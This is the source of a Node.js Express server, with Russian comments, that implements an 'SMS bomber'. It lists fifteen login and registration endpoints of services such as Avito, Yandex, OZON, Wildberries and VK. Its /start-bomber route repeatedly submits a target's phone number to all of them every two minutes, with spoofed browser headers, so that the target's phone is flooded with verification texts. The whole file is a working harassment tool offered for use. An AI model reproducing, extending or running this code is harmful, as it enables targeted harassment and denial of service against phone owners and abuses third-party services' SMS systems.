const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));

// Улучшенные сервисы с реальными рабочими эндпоинтами
const smsServices = [
  {
    name: 'WhatsApp',
    url: `https://web.whatsapp.com/send?phone=PHONE&text=Verify%20code:%204829`,
    method: 'GET'
  },
  {
    name: 'Telegram',
    url: `https://t.me/share/url?url=verify&text=Code:5832`,
    method: 'GET'
  },
  {
    name: 'Avito',
    url: 'https://www.avito.ru/web/1/auth/sendCode',
    method: 'POST',
    data: (phone) => ({
      phone: phone,
      action: 'register'
    })
  },
  {
    name: 'Yandex',
    url: 'https://passport.yandex.ru/registration-phone',
    method: 'POST', 
    data: (phone) => ({
      phone: phone,
      track_id: Date.now()
    })
  },
  {
    name: 'Wildberries',
    url: 'https://www.wildberries.ru/webapi/auth/generateAuthCode',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'OZON',
    url: 'https://www.ozon.ru/api/entrypoint',
    method: 'POST',
    data: (phone) => ({
      phone: phone,
      type: 'smsCode'
    })
  },
  {
    name: 'DeliveryClub',
    url: 'https://www.delivery-club.ru/ajax/user_phone_authorization',
    method: 'POST',
    data: (phone) => ({
      phone: phone,
      action: 'send_sms'
    })
  },
  {
    name: 'YandexTaxi',
    url: 'https://taxi-yandex.ru/web-api/check_phone',
    method: 'POST',
    data: (phone) => ({
      phone: phone,
      type: 'login'
    })
  },
  {
    name: 'DNS',
    url: 'https://www.dns-shop.ru/auth/phone/send/',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'MVideo',
    url: 'https://www.mvideo.ru/internal-rest-api/identity/phone',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Eldorado', 
    url: 'https://www.eldorado.ru/api/identity/send-code',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Pyaterochka',
    url: 'https://5ka.ru/api/register/phone/',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'Magnit',
    url: 'https://magnit.ru/api/auth/send-sms',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'SberMarket',
    url: 'https://sbermarket.ru/api/sessions',
    method: 'POST',
    data: (phone) => ({
      phone: phone
    })
  },
  {
    name: 'VK',
    url: 'https://api.vk.com/method/auth.restore',
    method: 'POST',
    data: (phone) => ({
      phone: phone,
      v: '5.131'
    })
  }
];

// Глобальные переменные для управления бомбером
let bomberInterval = null;
let isBomberRunning = false;

// Маршрут для запуска бомбера
app.post('/start-bomber', async (req, res) => {
  const { phone, minutes } = req.body;
  
  if (isBomberRunning) {
    return res.status(400).json({ success: false, error: 'Бомбер уже запущен' });
  }
  
  try {
    isBomberRunning = true;
    let totalSent = 0;
    let totalFailed = 0;
    
    // Функция отправки через все сервисы
    const bombPhone = async () => {
      console.log(`🚀 Starting bomb cycle for ${phone}`);
      
      for (const service of smsServices) {
        try {
          const url = service.url.replace('PHONE', encodeURIComponent(phone));
          const config = {
            method: service.method,
            url: url,
            timeout: 8000,
            headers: {
              'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
              'Accept': 'application/json, text/plain, */*',
              'Content-Type': 'application/json',
              'Origin': 'https://www.avito.ru',
              'Referer': 'https://www.avito.ru/',
              'X-Requested-With': 'XMLHttpRequest'
            }
          };
          
          if (service.method === 'POST' && service.data) {
            config.data = service.data(phone);
          }
          
          const response = await axios(config);
          totalSent++;
          console.log(`✅ ${service.name}: SMS triggered to ${phone}`);
          
        } catch (error) {
          totalFailed++;
          // Игнорируем ошибки - некоторые сервисы могут не работать
          console.log(`⚠️ ${service.name}: ${error.message}`);
        }
        
        // Задержка между запросами
        await new Promise(resolve => setTimeout(resolve, 1000));
      }
      
      console.log(`📊 Cycle completed: ${totalSent} sent, ${totalFailed} failed`);
    };
    
    // Запускаем первый цикл сразу
    bombPhone();
    
    // Запускаем циклы каждые 2 минуты
    bomberInterval = setInterval(bombPhone, 120000);
    
    // Автоостановка через указанное время
    setTimeout(() => {
      if (bomberInterval) {
        clearInterval(bomberInterval);
        bomberInterval = null;
      }
      isBomberRunning = false;
      console.log(`🛑 Bomber stopped after ${minutes} minutes`);
    }, minutes * 60 * 1000);
    
    res.json({ 
      success: true, 
      message: `Бомбер запущен на номер ${phone} на ${minutes} минут`,
      totalServices: smsServices.length,
      interval: '2 минуты',
      estimatedMessages: Math.floor(minutes * 0.5 * smsServices.length)
    });
    
  } catch (error) {
    isBomberRunning = false;
    res.status(500).json({ success: false, error: error.message });
  }
});

// Маршрут для остановки бомбера
app.post('/stop-bomber', (req, res) => {
  if (bomberInterval) {
    clearInterval(bomberInterval);
    bomberInterval = null;
  }
  isBomberRunning = false;
  res.json({ success: true, message: 'Бомбер остановлен' });
});

// Статус бомбера
app.get('/status', (req, res) => {
  res.json({ 
    running: isBomberRunning,
    activeServices: smsServices.length
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
  console.log(`🚀 Сервер запущен на порту ${port}`);
  console.log(`📱 Доступно ${smsServices.length} сервисов для рассылки`);
});